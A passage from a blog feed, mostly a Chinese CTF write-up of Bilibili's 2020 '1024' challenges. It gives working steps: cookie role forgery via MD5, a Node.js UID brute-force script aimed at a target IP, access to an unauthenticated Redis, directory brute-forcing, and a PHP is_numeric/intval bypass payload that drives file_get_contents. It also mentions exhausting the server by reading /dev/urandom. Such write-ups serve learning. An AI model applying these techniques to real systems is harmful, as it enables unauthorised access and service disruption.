class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, 